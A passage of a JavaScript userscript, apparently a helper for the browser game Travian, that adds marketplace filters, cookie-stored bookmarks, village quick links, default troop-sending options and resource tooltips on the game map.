			// Para Ofrezco y Busco se muestran 4 materiales y un quinto comodin
			for (var i = 0; i < 4; i++)
			{
				var td = $elem("TD", '', {
					'id': "filtro" + j + i,
					'title': T('RECURSO' + (i + 1))
				}, {}, tr);
				td.addEventListener("click", funcionFiltrosMercado(j, i + 1), 0);

				var ref = $elem("A", '<img src="' + img('r/' + (i + 1) + '.gif') + '" width="18" height="12" border="0" title="' + T('RECURSO' + (i + 1)) + '">', {}, {}, td);
			}
			var td = $elem("TD", '', {
				"id": "filtro" + j + "4"
			}, {
				'backgroundColor': '#F5F5F5'
			}, tr);
			td.addEventListener("click", funcionFiltrosMercado(j, 5), 0);

			var ref = $elem("A", T('CUALQUIERA'), {
				"href": "javascript:void(0)"
			}, {}, td);

		}

		// La fila del tipo especifica transacciones 1:1 o 1:x
		var tr = $elem("TR", "", {}, {}, table);
		$elem("TD", T('TIPO'), {}, {}, tr);
		var etiquetas_tipo = ["1:1", "1:>1", "1:<1", "1:x"];
		for (var i = 0; i < 4; i++)
		{
			var td = $elem("TD", "", {'id': 'filtro2' + i}, {}, tr);
			if (i == 3)
				td.setAttribute("style", "background-color:#F5F5F5");
			var ref = $elem("A", etiquetas_tipo[i], {'href': 'javascript:void(0)'}, {}, td);
			td.addEventListener("click", funcionFiltrosMercado(2, (i + 1)), 0);
		}
		$elem("TD", "", {}, {}, tr);

		var tr = $elem("TR", "", {}, {}, table);
		$elem("TD", T('MAXTIME'), {}, {}, tr);
		var etiquetas_tipo = ["1", "2", "3", ">3"];
		for (var i = 0; i < 4; i++)
		{
			var td = $elem("TD", "", {"id": "filtro4" + i}, {}, tr);
			if (i == 3)
				td.setAttribute("style", "background-color:#F5F5F5");
			var ref = $elem("A", etiquetas_tipo[i], {"href": "javascript:void(0)"}, {}, td);
			td.addEventListener("click", funcionFiltrosMercado(4, (i + 1)), 0);
		}
		$elem("TD", "", {}, {}, tr);

		var tr = $elem("TR", "", {}, {}, table);
		$elem("TD", T('DISPONIBLE'), {}, {}, tr);
		var etiquetas_carencia = [T('SI'), T('NO')];
		for (var i = 0; i < 2; i++)
		{
			var td = $elem("TD", "", {
				"colspan": 2,
				"id": "filtro3" + i
			}, {}, tr);
			if (i == 1)
				td.setAttribute("style", "background-color:#F5F5F5");
			var ref = $elem("A", etiquetas_carencia[i], {"href":"javascript:void(0)"}, {}, td);
			td.addEventListener("click", funcionFiltrosMercado(3, (i + 1)), 0);
		}
		$elem("TD", "", {}, {}, tr);

		// Busca la tabla de ofertas y la inserta justo antes
		var a = find("//table[@cellspacing='1' and @cellpadding='2' and @class='tbg' and not(@style)]", XPFirst);
		if (!a)
			return;
		var p = $elem("P");
		p.appendChild(table);
		a.parentNode.insertBefore(p, a);
	}

	function crearFuncionExplorarUnidades(id, coste)
	{
		var funcion = function()
		{
			var a = find("//input[@type='text']", XPList).snapshotItem(id - 1);
			var b = find("//div[@name='exp" + id + "']", XPFirst);
			var c = calculateResourceTime(arrayByN(coste, a.value));
			if (c)
				b.innerHTML = c;
			else
				b.innerHTML = '';
		};
		return funcion;
	}

	function tiempoExplorarUnidades()
	{
		if (!find("//form[@name='snd']//input[@type='image' and @value='ok']", XPFirst))
			return;
		var a = find("//table[@class='tbg']//tr[not(@class)]//table[@class='f10']", XPList);
		for (var i = 0; i < a.snapshotLength; i++)
		{
			var b = a.snapshotItem(i);
			var c = $tags("td", b)[2].textContent.split(" ")[0].split("|");
			var tr = $elem("TR");
			var td = $elem("TD", "", {
				"colspan": 2,
				"class": "c f7 s7"
			}, {}, tr);
			var div = $elem("DIV", "", {"name": "exp" + (i + 1)}, {}, td);

			// FIXME: Apanyo para Firefox. FF mete un nodo extra al principio de la tabla
			var d = b.childNodes;
			d[d.length - 1].appendChild(tr);

			$tags("input", b.parentNode.parentNode)[0].addEventListener("keyup", crearFuncionExplorarUnidades((i + 1), c), 0);
		}
	}

	function tiempoExplorar()
	{
		var a = find("//table[@class='tbg']//tr[@class='cbg1']", XPFirst);
		// FIXME: Apanyo para Firefox. FF mete varios nodos extras entre las columnas
		if (a == null || (a.childNodes.length != 2 && a.childNodes.length != 4))
			return;

		var a = a.parentNode.childNodes;
		for (var i = 1; i < a.length; i++)
		{
			var b = a[i];
			var c = $tags("div", b);
			if (c.length == 2 && c[1].className == 'c')
			{
				var d = $tags("td", b)[3].textContent.split("|").splice(0, 4);
				var e = calculateResourceTime(d);
				if (e)
					c[1].innerHTML = e;
			}
		}
	}

	/** Modifie la valeur par défaut type d'attaque à envoyer */
	APAinfo = readCookie("APAinfo");
	if (APAinfo == true || APAinfo == null)
	{
		var APA = 3
	}
	APAinfo = readCookie("APAinfo");
	if (APAinfo == false || APAinfo == null)
	{
		var APA = 4
	}


		function ataqueDefecto()
	{
		var accion = APA; // 2 -> Assistance, 3 -> Attaque, 4 -> Pillage
		//var cities = find("//div[preceding-sibling::div[@class='div4']]//table[@class='f10']", XPFirst);
		var cities = find("//div[@id='lright1']//table[@class='f10']", XPFirst);
		if (cities && location.href.search(/z=(\d+)/) >= 0)
		{
			var z = RegExp.$1;
			cities = cities.firstChild;
			for (var i = 0; i < cities.childNodes.length; i++)
			{
				var city = cities.childNodes[i];
				city.textContent.search(/\((.*)\n?\|\n?(.*)\)/);
				var id = xy2id(RegExp.$1, RegExp.$2);
				if (id == z)
					accion = 2;
			}
		}

		if (find("//input[@name='c' and @value='" + accion + "']", XPFirst))
			find("//input[@name='c' and @value='" + accion + "']", XPFirst).checked = true;
	}

	/**Insérer un nouveau marqueur et magasins
	 *
	 * Params:
	 *	texto:	Texto del marcador
	 *	enlace:	Enlace a donde apunta el marcador
	 */
	function agregarElementoCookie(cookie, values)
	{
		var nuevo = '';
		for (var i = 0; i < values.length; i++)
		{
			if (values[i] != '')
			{
				nuevo += values[i];
				if (i != values.length - 1)
					nuevo += '$';
			}
			else
				return;
		}
		var a = readCookie(cookie + "_" + server);
		if (a != null && a != '')
			a += "$$" + nuevo;
		else
			a = nuevo;
		createCookie(cookie + "_" + server, a, 365);
	}

	/** Il crée l'événement à supprimer un marqueur. Il supprime également et actualise la liste qui sont affichés
	 *
	 * Params:
	 * 	num:	Identificador de marcador a eliminar
	 */
	function crearEventoEliminarCookie(cookie, num, funcion)
	{
		return function()
		{
			var a = readCookie(cookie + "_" + server);
			if (a != null)
			{
				a = a.split("$$");
				a.splice(num, 1);
				createCookie(cookie + "_" + server, a.join("$$"), 365);
				removeElement(cookie);
				funcion();
			}
		}
	}

	/** Récupérer marqueurs stockées. Deux marqueurs sont séparés par le symbole $$ y
	 * en cada marcador el enlace y el texto estan separados por $. No se espera encontrar esos simbolos
	 * en el texto o en los enlaces, ya que de lo contrario fallaria.
	 *
	 * Returns:
	 *	Un array con cada uno de los marcadores
	 */
	function obtenerValorCookie(cookie)
	{
		// Importar marcadores de versiones antiguas del script
		// FIXME: Eliminar dentro de unas cuantas versiones
		var b = readCookie(cookie);
		if (b != null && b != '')
		{
			createCookie(cookie + "_" + server, b, 365);
			eraseCookie(cookie);
		}

		var res = new Array();
		var a = readCookie(cookie + "_" + server);
		if (a != null && a != '')
		{
			a = a.split("$$");
			for (var i = 0; i < a.length; i++)
				res[i] = a[i].split("$");
		}
		return res;
	}

	/** Affiche stockées marqueurs */
	function mostrarMarcadores()
	{
		// Intenta insertarlos en la lista derecha, si no existe la crea
		var ba = get('lright1');
		if (!ba)
		{
			ba = $elem("DIV", "", {"id": "lright1"}, {}, 'lmidall');
		}
		var div = $elem("DIV", "", {"id": "marcadores"});
		var titulo = $elem("B", T('MARCADORES') + ":", {"class": "f10"});
		var enlace = $elem("A", '<font color=#FF0000><i>' + T('ANYADIR') + '</i></font>', {"href": "javascript:void(0)"});
		var tabla = $elem("TABLE", "", {"class": "f10"});
		// Al anyadir se pide el texto y el enlace, si se cancela o se deja vacio alguno se aborta
		// Despues de insertar se refresca la lista volviendola a insertar
		enlace.addEventListener("click", function()
		{
			var a = prompt(T('ENLACE'), window.location.href);
			//	if (a == null || a == '' || a == 'undefined') return;
			if (a == null || a == '')
				return;
			var b = prompt(T('TEXTO'));
			//	if (b == null || b == '' || b == 'undefined') return;
			if (b == null || b == '')
				return;
			agregarElementoCookie("marcadores", [b, a]);
			removeElement('marcadores');
			mostrarMarcadores();
		}, 0);
		div.appendChild(titulo);
		div.appendChild(document.createTextNode(" ("));
		div.appendChild(enlace);
		div.appendChild(document.createTextNode(")"));
		div.appendChild(tabla);
		var p = $elem("P");
		p.appendChild(div);
		ba.appendChild(p);
		div.parentNode.setAttribute('style', 'white-space:nowrap');
		//ba.appendChild(div);

		// TMR - set bookmarks.
		var arrCities = new Array();
		var cities = find("//div[@id='lright1']/table[@class='f10']/tbody", XPFirst);
		if (cities != null && cities.firstChild != null)
		{
			for (var i = 0; i < cities.childNodes.length; i++)
			{
				// Utiliza el texto de las coordenadas para averiguar el ID necesario para los enlaces
				var city = cities.childNodes[i];
				/*
				city.innerHTML.search(/newdid=(\d+)/);
				var newdid = RegExp.$1;
				*/
				arrCities.push(city.innerHTML.match(/newdid=(\d+)/)[1]);
			}
		}

		var bookmarks = new Array();
		//  bookmarks.push('<font color=#0000FF>Académie :</font>::build.php?gid=22');
		//  bookmarks.push('<font color=#0000FF>Usine de poteries :</font>::build.php?gid=6');
		//  bookmarks.push('<font color=#0000FF>Embassade :</font>::build.php?gid=18');
		//  bookmarks.push('<font color=#0000FF>Moulin niveau :</font>::build.php?gid=8');
		//  bookmarks.push('<font color=#0000FF>Scierie :</font>::build.php?gid=5');
		//  bookmarks.push('<font color=#0000FF>Silo de céréales :</font>::build.php?gid=11');
		//  bookmarks.push('<font color=#0000FF>Manoir du héros :</font>::build.php?gid=37');
		//  bookmarks.push('<font color=#0000FF>Bâtiment principal :</font>::build.php?gid=15');
		//  bookmarks.push('<font color=#0000FF>Place du Marché :</font>::build.php?gid=17');
		//  bookmarks.push('<font color=#0000FF>Place de rassemblement :</font>::build.php?gid=16');
		//  bookmarks.push('<font color=#0000FF>Fonderie :</font>::build.php?gid=7');
		//  bookmarks.push('<font color=#0000FF>Warehouse :</font>::build.php?gid=10');
		if (location.href.match(/gid=14/))
		{
			bookmarks.push('<font color=#0000FF>PT :</font>::build.php?gid=14');
		};
		bookmarksinfo0 = readCookie("bookmarksinfo0" + server);
		var tmpStr1 = '<font color=#0000FF>';
		var tmpStr2 = ' :</font>::build.php?gid=';
		if (bookmarksinfo0 == true || bookmarksinfo0 == null)
		{
			bookmarks.push(tmpStr1 + T('HOT') + tmpStr2 + '24');
		};
		bookmarksinfo1 = readCookie("bookmarksinfo1" + server);
		if (bookmarksinfo1 == true || bookmarksinfo1 == null)
		{
			bookmarks.push(tmpStr1 + T('PAL') + tmpStr2 + '26');
			bookmarks.push(tmpStr1 + T('RESI') + tmpStr2 + '25');
			bookmarks.push(tmpStr1 + T('MAN') + tmpStr2 + '37');
		};
		bookmarksinfo2 = readCookie("bookmarksinfo2" + server);
		if (bookmarksinfo2 == true || bookmarksinfo2 == null)
		{
			bookmarks.push(tmpStr1 + T('CUARTEL') + tmpStr2 + '19');
			bookmarks.push(tmpStr1 + T('CORRAL') + tmpStr2 + '20');
			bookmarks.push(tmpStr1 + T('TALLER') + tmpStr2 + '21');
		};
		bookmarksinfo3 = readCookie("bookmarksinfo3" + server);
		if (bookmarksinfo3 == true || bookmarksinfo3 == null)
		{
			bookmarks.push(tmpStr1 + T('USI') + tmpStr2 + '13');
			bookmarks.push(tmpStr1 + T('ARM') + tmpStr2 + '12');
		};

		//  bookmarks.push('<font color=#0000FF>'+T('PAL')+' PC :</font>::build.php?gid=26&s=2');
		//  bookmarks.push('<font color=#0000FF>'+T('RESI')+' :</font>::build.php?gid=25');

		for (var i = 0; i < bookmarks.length; i++)
		{
			var temp = bookmarks[i].split('::');
			var tr = $elem("TR");
			var className = '';
			if (location.href.substring(location.href.length - temp[1].length, location.href.length) == temp[1]) //highlight if we're on this page
				className = 'class=c2';
			var td = $elem("TD", "<span " + className + ">&#8226;</span>&nbsp; <a href='" + temp[1] + "'> " + temp[0] + "</a> ");
			td.style.whiteSpace = 'nowrap';
			tr.appendChild(td);
			for (var j = 0; j < arrCities.length; j++)
			{
				td = $elem("TD", "<a href='" + temp[1] + "&newdid=" + arrCities[j] + "'> " + (j + 1) + " </a>");
				tr.appendChild(td);
			}
			tabla.appendChild(tr);
		}

		// Se obtienen los marcadores y se insertan junto con un enlace para eliminarlos
		var marcadores = obtenerValorCookie("marcadores");
		for (var i = 0; i < marcadores.length; i++)
		{
			var tr = $elem("TR", '', {}, {}, tabla);
			var td;
			// this will ignore any incorrectly formatted bookmark entry
			if (marcadores[i][1] == undefined)
			continue;

			/*if (((marcadores[i][1].search(/karte.php\?d=(\d+)/))) > 0)
			{
				td = $elem('TD', '', {}, {}, tr)
				var a = RegExp.$1;
				imgx = readCookie("imgx");

				$elem('span', '&#8226;&nbsp; ', {}, {}, td);
				$elem('a', marcadores[i][0], {'href': marcadores[i][1], 'class': 'done', 'done':'1'}, {}, td);
				$elem('span', ' (' + zid2x(a) +'|' + zid2y(a) +') ', {'class':'done'}, {'wordBreak':'keep-all', 'font':'11px/1.5em Tahoma,Verdana,Arial !important', 'color':'grey'}, td);

				var aA2b = $elem('a', '', {'href':'a2b.php?z=' + a}, {}, td);
					$elem('img', '', {'width':'11', 'border':'0', 'src': img('a/def1.gif'), 'title':T('ATACAR')}, {}, aA2b);

				var aBuild = $elem('a', '', {'href':'build.php?z='+a+'&gid=17'}, {}, td);
					$elem('img', '', {'src': img('r/4.gif'), 'width':'18', 'border':'0', 'title':T('ALDEA_EXTRA2')}, {}, aBuild);

				var aKarte = $elem('a', '', {'href':'karte.php?z='+a, 'target':'_blank'}, {}, td);

				var imgSource = (imgx) ? imagenes['globe'] : img('a/globe.gif');

				$elem('img', '', {'src': imgSource, 'height':'11', 'border':'0', 'title':T('ALDEA_EXTRA3')}, {}, aKarte);

			}
			else*/
				td = $elem("TD", "<span>&#8226;</span>&nbsp; <a href='" + marcadores[i][1] + "'>" + marcadores[i][0] + "</a>", {}, {}, tr);

			var enlace = $elem("A", " <img src='" + img('a/del.gif') + "' width='12' height='12' border='0' title='" + T('ELIMINAR') + "'>", {'href':'javascript:void(0);'}, {}, td);
			enlace.addEventListener("click", crearEventoEliminarCookie("marcadores", i, mostrarMarcadores), 0);
		}

		blocNotasinfo = readCookie("blocNotasinfo" + server);
		if (blocNotasinfo == true || blocNotasinfo == null)
		{
			blocNotas2(div);
		}
	}


	/** Il crée des liaisons directes dans la liste de villages pour envoyer des troupes ou envoyer des commerçants */
	function cityLinks()
	{
		// Localiza la lista de aldeas
		var cities = find("//div[@id='lright1']//table[@class='f10']", XPFirst);
		if (!cities)
			return;

		cities = cities.firstChild;
		for (var i = 0; i < cities.childNodes.length; i++)
		{
			// Utiliza el texto de las coordenadas para averiguar el ID necesario para los enlaces
			var city = cities.childNodes[i];
			city.textContent.search(/\((.*)\n?\|\n?(.*)\)/);
			var x = RegExp.$1;
			var y = RegExp.$2;
			var id = xy2id(x, y);
			city.innerHTML.search(/newdid=(\d+)/);
			var newdid = RegExp.$1;
			city.innerHTML.search(/&gid=24(\d+)/);
			var gid24 = RegExp.$1;

			city.textContent.search(/\s+(.*)\n/);
			var cityname = RegExp.$1;
			$elem("TD", "<a href='a2b.php?z=" + id + "'><img src='" + img('/a/def1.gif') + "' width='12' border='0' title='" + T('ALDEA_EXTRA1') + "'>" + "</a>", {}, {}, city);
			$elem("TD", "<a href='build.php?z=" + id + "&gid=17'><img src='" + img('/r/4.gif') + "' width='18' border='0' title='" + T('ALDEA_EXTRA2') + "'>" + "</a>", {}, {}, city);
			//	city.appendChild($elem("TD", "<a href='dorf2.php?newdid=" + newdid + "'>" + "<img src='img/un/a/b1.gif' width='12' border='0' title='" + T('ALDEA_EXTRA5') + "'>" + "</a>"));
			imgx = readCookie("imgx");
			if (imgx == false || imgx == null)
				$elem("TD", "<a target='_blank'; href='karte.php?z=" + id + "'><img src='" + img('/a/globe.gif') + "' height='11' border='0' title='" + T('ALDEA_EXTRA3') + "'>" + "</a>", {}, {}, city);
			else
				$elem("TD", "<a target='_blank'; href='karte.php?z=" + id + "'>" + "<img src='" + imagenes['globe'] + "' height='11' border='0' title='" + T('ALDEA_EXTRA3') + "'>" + "</a>", {}, {}, city);
			//	city.appendChild($elem("TD", "<a href='build.php?gid=24&newdid=" + newdid + "'>" + "<img src='img/un/a/b2.gif' width='3' border='0' title='" + T('ALDEA_EXTRA4') + "'>" + "</a>")); <img src='data:image/gif;base64," + imagenes['globes'] + "' width='18' height='12' border='0'
		}
	}

	/** Returns the ID of the current city (often referred to as Z) */
	function getCurrentCityID()
	{
		var xy = getCurrentCityXY();
		return xy2id(xy[0], xy[1]);
	}

	/** Renvoie un tableau contenant les xy coordonnées de la ville actuelle.  0 is X, 1 is Y */
	function getCurrentCityXY()
	{
		var xy = new Array();

		var activeX;
		var activeY = 0;
		if (find("//a[@class='active_vl']", XPFirst) == null)
		{
			xy.push(0);
			xy.push(0);
		}
		else
		{
			find("//a[@class='active_vl']", XPFirst).parentNode.nextSibling.textContent.match(/\(([-\d]+)\n\|\n([-\d]+)\)/);
			xy.push(RegExp.$1);
			xy.push(activeY = RegExp.$2);
		}
		return xy;
	}

	/** Convertit tous les liens vers la page elle-même comme "#" vide que des liens javascript */
	function sanearEnlaces()
	{
		var a = find("//a[@href='#']", XPList);
		for (var i = 0; i < a.snapshotLength; i++)
			a.snapshotItem(i).href = 'javascript:void(0)';
	}

	/** Il calcule et affiche le temps qu'il a prises depuis le début de l'exécution du script */
	function calcularTiempoEjecucion()
	{
		var tiempo = new Date().getTime() - tiempo_ejecucion;
		//var div = find("//div[@class='div3']", XPFirst);
		var div = get('ltime');
		// TMR - put this on the same line, not down in the graphics...
		//	div.innerHTML=div.innerHTML.replace(" ms<br>",'ms.&nbsp;TBH: <b>'+tiempo+'</b>ms<br>');
		div.innerHTML = div.innerHTML.replace(" ms", 'ms. TBH: ' + tiempo + 'ms');
		div.style.width = "350px"; // added for this property
		div.appendChild($elem('BR'));
		div.appendChild($elem('BR'));
		div.appendChild($elem('BR'));
		var setupLink = $elem('A', "<font style='font-size:10px' color=#FF0000>TBH Setup</font>", {
			"href": "#",
			"id": "tbsetup"
		}, {}, div);
		setupLink.addEventListener("click", mostrarConfiguracion, 0);
	}

	function installMapEventHandler()
	{
		var origpe = unsafeWindow.ve;
 		unsafeWindow.ve = function(pd,qd)
		{
		   var rv = origpe(pd,qd);
		   setTimeout(infoRecursos,10);
		   return rv;
		}
		for(var i=1;i<50;i++)
		{
			var k1=(i-1)%7;
			var k2=Math.floor((49-i)/7);

		    var area = get("a_"+k1+"_"+k2);
  		    var mevobj = createMapInfoObj(area,i-1);
			area.addEventListener("mouseover",mevobj.mouseOverEvent,false);
			area.addEventListener("mouseout", mevobj.mouseOutEvent,false);
		}
	}

	function installMapEventHandler1()
	{
		for(var i=1;i<50;i++)
		{
			var k1 = (i - 1) % 7;
			var k2 = Math.floor((49 - i) / 7);

			var area = get("a_"+k1+"_"+k2);
	  		var mevobj = createMapInfoObj1(area, i - 1);
			area.addEventListener("mouseover",mevobj.mouseOverEvent, false);
			area.addEventListener("mouseout", mevobj.mouseOutEvent, false);
		}
	}

	function installMapEventHandler2()
	{
		var a = find("//img[contains(@src, '.gif')]", XPFirst);
		var oases = [];
		var i = 0, j = 0;
		while (a)
		{
			j++;
			if (a.src.match(/\/(o)\d*.gif$/))
			{
				oases[j] = 1;
				i++;
			}
			a = a.nextSibling;
		}

		a = find("//area[contains(@onclick, 'karte.php')]", XPFirst);

		i = 0; j = 0;
		while (a)
		{
			if (a.hasAttributes())
			{
				var node = a.attributes.getNamedItem("onclick");
				j++;
				if (node && node.nodeValue)
				{
					var href = node.nodeValue.match(/\?d=(\d+)\&c=([^\"]+)\"/);
					var href2 = href.pop();
					var href1 = href.pop();
					href= "karte.php?d=" + href1 + "&c=" + href2;

			  		var mevobj = createMapInfoObj2(a, href, oases[j]);
					a.addEventListener("mouseover", mevobj.mouseOverEvent, false);
					a.addEventListener("mouseout", mevobj.mouseOutEvent, false);
				}
			}
			a = a.nextSibling;
		}
	}

	function createMapInfoObjGeneric(area, pos, regExpr, callBack1, id, callBack2)
	{
		var mev = {
			'area': area,
			'pict': get("i_" + area.id.substring(2)),
			'pos': pos,
			'timeout': 0,
			'mouseOverEvent' : function()
			{
				if (mev.pict.src.match(regExpr))
				{
					mev.timeout = setTimeout(function()
					{
						ajaxRequest(mev.area.href, "GET", null, function(t)
						{
							if (mev.timeout != 0)
								callBack1(t, mev)
						}, dummy);
					}, 300);
				}
			},

			'mouseOutEvent' : function()
			{
				clearTimeout(mev.timeout);
				mev.timeout = 0;
				get(id).style.display = 'none';
			},

			'scan' : function()
			{
				ajaxRequest(mev.area.href, "GET", null, function(t)
				{
					callBack2(t, mev)
				}, dummy);
			}
		};
		return mev;
	}

	function createMapInfoObj(area, pos) { return createMapInfoObjGeneric(area, pos, /\/(d|t)\d*.gif$/, procesarCasilla, "tb_tooltip", parseFieldType2); }
	function createMapInfoObj1(area, pos) { return createMapInfoObjGeneric(area, pos, /\/(o)\d*.gif$/,   parseFieldType3, "tb_nature",  parseFieldType3); }

	function createMapInfoObj2(area, href, isoas){
		var mev = new Object();
		mev.area = area;
		mev.timeout=0;
		mev.mouseOverEvent = function() {
			if (isoas) {
				mev.timeout = setTimeout(function()
				{
					ajaxRequest(href, "GET", null,
						function(t)
						{
							if (mev.timeout!=0) parseFieldType3(t, mev);
						},
						dummy);
				}, 300);
			}
		}
		mev.mouseOutEvent = function()
		{
			clearTimeout(mev.timeout);
			mev.timeout = 0;
			get("tb_nature").style.display = 'none';
		}
		mev.scan = function()
		{
			ajaxRequest(href, "GET", null, function(t)
			{
				parseFieldType3(t,mev)
			}, dummy);
		}
		return mev;
	}

	function parseFieldType(t, mev)
	{
		// Carga la pagina resultado en un arbol DOM para hacer busquedas por XPath
		var ansdoc = document.implementation.createDocument("", "", null);
		var ans = $elem('DIV', t.responseText, {}, {}, ansdoc);
		// Parece haber dos versiones del juego, asi que se contemplan las dos
		if (ansdoc.evaluate("//div[starts-with(@id, 'f')]", ans, null, XPFirst, null).singleNodeValue)
			ansdoc.evaluate("//div[starts-with(@id, 'f')]", ans, null, XPFirst, null).singleNodeValue.id.search(/f(\d)/);
		else
			ansdoc.evaluate("//img[@id='resfeld']", ans, null, XPFirst, null).singleNodeValue.src.search(/\/f(\d)\.jpg$/);
		var fieldtype = RegExp.$1;
		//save to storage
		var pos = mev.area.href.match(/d=(\d+)/).pop();
		return fieldtype;
	}

	function parseFieldType2(t, mev)
	{
		var fieldType = parseFieldType(t, mev);
		showCellInfo(mev.pos + 1, fieldType);
		return	fieldType;
	}

	function parseFieldType3(t, mev)
	{
		var ansdoc = document.implementation.createDocument("", "", null);
		var ans = $elem('DIV', t.responseText, {}, {}, ansdoc);

		if (ansdoc.evaluate("//img[@id='resfeld']", ans, null, XPFirst, null).singleNodeValue.src.search(/\/w(\d+)\.jpg$/))
		{
			var fieldtype = RegExp.$1;

			if ((fieldtype < 1) || (fieldtype > 12))
				return;

			var a = ansdoc.evaluate("//table[@class='f10']", ans, null, XPFirst, null).singleNodeValue;

			var sum = [0, 0, 0];
			var b = "";
			if (a)
			{
				a = a.firstChild;
				for (var i = 0; i < a.childNodes.length; i++)
				{
					b = b + "<tr>";
					var tr = a.childNodes[i];

					if (tr.childNodes[0].firstChild.src)
					{
						var ind = tr.childNodes[0].firstChild.src.match(/^(.*)img\/un\/u\/(\d+)\.gif$/);
						if (ind.length < 3)
							return;
						var index = ind.pop() - 31;
						var path = ind.pop();

						b = b + "<td><img src=" + tr.childNodes[0].firstChild.src + "></td><td align=right>" + tr.childNodes[1].textContent + "</td></tr>";
						sum[0] += tr.childNodes[1].textContent * def1[index];
						sum[1] += tr.childNodes[1].textContent * def2[index];
						sum[2] += tr.childNodes[1].textContent * crop[index];
					}
					else
					{
						b = b + "<td>" + tr.childNodes[0].textContent + "</td></tr>";
					}
				}
			}
			if (b != "")
			{
				b = "<table class='f8' cellpadding=0 cellspacing=0 border=0>" + b;
				if (sum[0] + sum[1] + sum[2])
				{
					b += "<tr><td><img src=" + path + "img/un/a/def_i.gif width=16 height=16 border=0></td><td align=right>&nbsp;" + sum[0] + "</td></tr>";
					b += "<tr><td><img src=" + path + "img/un/a/def_c.gif width=16 height=16 border=0></td><td align=right>&nbsp;" + sum[1] + "</td></tr>";
					b += "<tr><td><img src=" + path + "img/un/r/5.gif width=18 height=12 border=0></td><td align=right>" + sum[2] + "</td></tr>";
				}
				b += "</table>";

				var div = get("tb_nature");
				div.style.display = 'block';
				div.innerHTML = b;
			}
		}
		return;
	}

	function showCellInfo(pos, type)
	{
		var itext = ['', '(9)', '<img src=' + img('r/3.gif', false) + '>', '(6)', '<img src=' + img('r/2.gif', false) + '>', '<img src=' + img('r/1.gif', false) + '>', '(15)'];
		var celldiv = get('map_info_' + pos);
		celldiv.innerHTML = itext[type];
		var showInfo = getOption("showmapinfo", true, "boolean");
		celldiv.style.display = showInfo ? '' : 'none';
	}

	/** Traitement d'une réponse XMLHttpRequest par page d'une case pour afficher une info-bulle de l'information sur leurs ressources * Terkepkocka valasz parser. */
	function procesarCasilla(t, mev)
	{
		var fieldtype = parseFieldType(t, mev);
		showFieldTypeInTooltip(fieldtype);
	}


	function showFieldTypeInTooltip(fieldtype)
	{
		// Solo hay 6 tipos de casillas
		var dist = [[3, 3, 3, 9], [3, 4, 5, 6], [4, 4, 4, 6], [4, 5, 3, 6], [5, 3, 4, 6], [1, 1, 1, 15]];
		var info = dist[fieldtype - 1];
		var div = get("tb_tooltip");
		div.style.display = 'block';
		div.innerHTML = '';
		for (var i = 1; i < 5; i++)
			div.innerHTML += '<img src="' + img('r/' + i + '.gif') + '" width="18" height="12" border="0" title="' + T('RECURSO' + i) + '">' + info[i - 1] + ' ';
	}

	/** Ajouter un événement pour afficher les informations dans tableau de ressources sur la carte * Carte générateur des infos resources */
	function infoRecursos()
	{

		function processMapGetResponse(r)
		{
			var cellinfos = r.split(",");
			for (var i = 0; i < 49; i++)
			{
				if (cellinfos[i] > 0 && cellinfos[i] < 10)
					showCellInfo(i + 1, cellinfos[i]);
			}
		}

		/*function updateTooltip(e){
		 var div = get("tb_tooltip");
		 if(div.clientWidth!=0 && e.pageX+5+div.clientWidth - document.documentElement.scrollLeft > document.documentElement.clientWidth)
		 div.style.left = (e.pageX - 5 - div.clientWidth) + "px";
		 else
		 div.style.left = (e.pageX + 5) + "px";

		 if(div.clientHeight!=0 && e.pageY+5+div.clientHeight - document.documentElement.scrollTop > document.documentElement.clientHeight)
		 div.style.top = (e.pageY - 5 - div.clientHeight) + "px";
		 else
		 div.style.top = (e.pageY + 5) + "px";
		 }*/
		/**
		 * Crea una funcion que se encarga del evento al desplazarse en el mapa. Actualiza la direccion destino en
		 * base al desplazamiento configurado
		 *
		 * Params:
		 * 	i:	Ordinal sobre la orientacion de la flecha
		 *
		 * Returns:
		 *	La funcion que gestiona el evento
		 */
		function createEventoMapa(i, href)
		{
			var funcion = function()
			{
				var despl = [-801, 1, 801, -1];
				var d = parseInt($names("desp")[0].value);
				if (isNaN(d) || d < 1)
					d = 1;
				setOption("desp", d);
				var base = parseInt(href.split("=")[1]);
				var zval = i < 4 ? (base + (despl[i] * (d - 1))) : (base + (despl[i % 4] * 6));
				ajaxRequest("ajax.php?action=map_content&z=" + zval, "GET", null, function(t)
				{
					get("map_content").innerHTML = t.responseText;
					infoRecursos();
					removeElement("tabla_mapa");
					genMapTable();
				}, dummy);
			};
			return funcion;
		}

		function mapScan()
		{
			var mapcontent = get('map_content');
			var j = 0;
			for (var i = 1; i < 50; i++)
			{
				if (get('map_info_' + i).innerHTML == '')
				{
					var k1 = (i - 1) % 7;
					var k2 = Math.floor((49 - i) / 7);
					if (get("i_" + k1 + "_" + k2).src.match(/\/(d|t)\d*.gif$/))
					{
						var area = get("a_" + k1 + "_" + k2);
						var mevobj = createMapInfoObj(area, i - 1);
						setTimeout(mevobj.scan, j * 600 + getRandTimeRange(600));
						j++;
					}
				}
			}
		}

		/**
		 */
		function desplazarMapa()
		{
			if (get('map_opts'))
				removeElement('map_opts');

			// Crea y anyade la casilla del desplazamiento
			var b = find("//form[@method='post']", XPFirst).parentNode;
			var ctable = $elem("TABLE", "", {"id": "map_opts"}, {}, b);
			var ctbody = $elem("TBODY", "", {}, {}, ctable);
			trc = $elem("TR", "", {}, {}, ctbody);
			tdc = $elem("TD", "", {"colspan": 2}, {}, trc);
			var mapScana = $elem("A", T('MAPSCAN'), {
				"id": "mapscan",
				"href": 'javascript:void(0)'
			}, {}, tdc);
			mapScana.addEventListener("click", mapScan, 0);
			document.addEventListener("mousemove", updateTooltip, 0);
		}

		/**
		 * Realiza un resumen de la pagina del mapa
		 */
		function genMapTable()
		{
			if (get('tabla_mapa'))
				removeElement('tabla_mapa');

			var table = $elem('TABLE', "", {
				"id": "tabla_mapa",
				"sortCol": -1,
				"class": "tbg",
				"align": textDirection == "ltr" ? "left" : "right",
				"cellspacing": 1,
				"cellpadding": 2
			}, {"clear":"both"});
			var thead = $elem("THEAD", "", {}, {}, table);
			var tbody = $elem("TBODY", "", {}, {}, table);
			var fila = $elem('TR', "", {'class': "rbg"}, {}, thead);
			var etiquetas_tabla = ["JUGADOR", "ALIANZA", "ALDEA", "HAB", "COORD", "ACCION"];
			//		var etiquetas_tabla = ["JUGADOR", "ALIANZA", "ALDEA", "HAB"];
			for (var i = 0; i < etiquetas_tabla.length; i++)
			{
				var td = $elem('TD', T(etiquetas_tabla[i]));
				if (i < 4)
				{
					switch (i)
					{
						case 3:
